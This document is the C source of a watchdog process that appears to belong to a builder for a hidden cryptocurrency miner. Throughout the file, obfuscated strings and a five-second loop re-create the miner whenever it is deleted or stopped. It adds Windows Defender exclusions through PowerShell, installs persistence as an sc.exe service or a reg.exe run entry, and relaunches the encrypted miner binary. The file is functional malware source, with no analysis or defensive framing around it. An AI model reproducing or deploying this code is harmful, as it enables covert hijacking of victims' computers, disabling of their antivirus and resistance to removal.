#include "ntddk.h"

#include "common.h"
#include "obfuscateu.h"

int main(int argc, char *argv[])
{
    UNICODE_STRING ustring = init_unicode_string(AYU_OBFW(L"\\BaseNamedObjects\\#WATCHDOGID"));
    OBJECT_ATTRIBUTES attr = { 0 };
    InitializeObjectAttributes(&attr, &ustring, 0, NULL, NULL);

    HANDLE hMutex;
    if (!NT_SUCCESS(UtCreateMutant(&hMutex, AYU_OBFC(MUTANT_ALL_ACCESS), &attr, TRUE))) {
        return 0;
    }

    bool isAdmin = check_administrator();

    PUT_PEB_EXT peb = (PUT_PEB_EXT)SWU_GetPEB();
    wchar_t* pebenv = (wchar_t*)peb->ProcessParameters->Environment;

    wchar_t sysdir[MAX_PATH] = { 0 };
    combine_path(sysdir, get_env(pebenv, AYU_OBFW(L"SYSTEMROOT=")), AYU_OBFW(L"\\System32"));

    wchar_t cmdPath[MAX_PATH] = { 0 };
    combine_path(cmdPath, sysdir, AYU_OBFW(L"\\cmd.exe"));

    wchar_t powershellPath[MAX_PATH] = { 0 };
    combine_path(powershellPath, sysdir, AYU_OBFW(L"\\WindowsPowerShell\\v1.0\\powershell.exe"));

    wchar_t startupPath[MAX_PATH] = { 0 };
    combine_path(startupPath, get_env(pebenv, isAdmin ? AYU_OBFW(L"PROGRAMDATA=") : AYU_OBFW(L"$BASEDIR")), AYU_OBFW(L"#STARTUPFILE"));

    wchar_t regPath[MAX_PATH] = { 0 };
    combine_path(regPath, sysdir, AYU_OBFW(L"\\reg.exe"));

    wchar_t scPath[MAX_PATH] = { 0 };
    combine_path(scPath, sysdir, AYU_OBFW(L"\\sc.exe"));

#if DefMineETH
    bool hasGPU = has_gpu();
#endif

    LARGE_INTEGER sleeptime;
    sleeptime.QuadPart = -(AYU_OBFC(5000 * 10000));

    ULONG fileSize;
    PVOID minerFile = read_file(startupPath, &fileSize);
    cipher((BYTE*)minerFile, fileSize);

    wchar_t ntPath[MAX_PATH + 4] = { 0 };
    combine_path(ntPath, AYU_OBFW(L"\\??\\"), startupPath);
    ustring = init_unicode_string(ntPath);
    InitializeObjectAttributes(&attr, &ustring, AYU_OBFC(OBJ_CASE_INSENSITIVE), NULL, NULL);
    FILE_BASIC_INFORMATION file_info;

    while (true) {
        UtDelayExecution(FALSE, &sleeptime);
        bool minerMissing = false;
        $WATCHDOGSET

        bool isAdminInstalled = isAdmin ? install_check(startupPath) : true;
        if ((!check_mutex(AYU_OBFW(L"\\BaseNamedObjects\\#MUTEXMINER")) && minerMissing) || !NT_SUCCESS(UtQueryAttributesFile(&attr, &file_info)) || !isAdminInstalled) {
#if DefWDExclusions
            run_program(true, sysdir, powershellPath, AYU_OBFW(L"%S #WDCOMMAND"), powershellPath);
#endif
            if (isAdmin) {
                if (!isAdminInstalled) {
                    run_program(true, sysdir, scPath, AYU_OBFW(L"%S delete \"#STARTUPENTRYNAME\""), scPath);
                    run_program(true, sysdir, scPath, AYU_OBFW(L"%S create \"#STARTUPENTRYNAME\" binpath= \"%S\" start= \"auto\""), scPath, startupPath);
                }
            }
            else {
                run_program(true, sysdir, regPath, AYU_OBFW(L"%S #STARTUPADDUSER"), regPath, startupPath);
            }

            cipher((BYTE*)minerFile, fileSize);
            write_file(startupPath, minerFile, fileSize);
            cipher((BYTE*)minerFile, fileSize);

            run_program(false, sysdir, startupPath, AYU_OBFW(L"\"%S\""), startupPath);
        }
    }

    UtClose(hMutex);
	return 0;
} 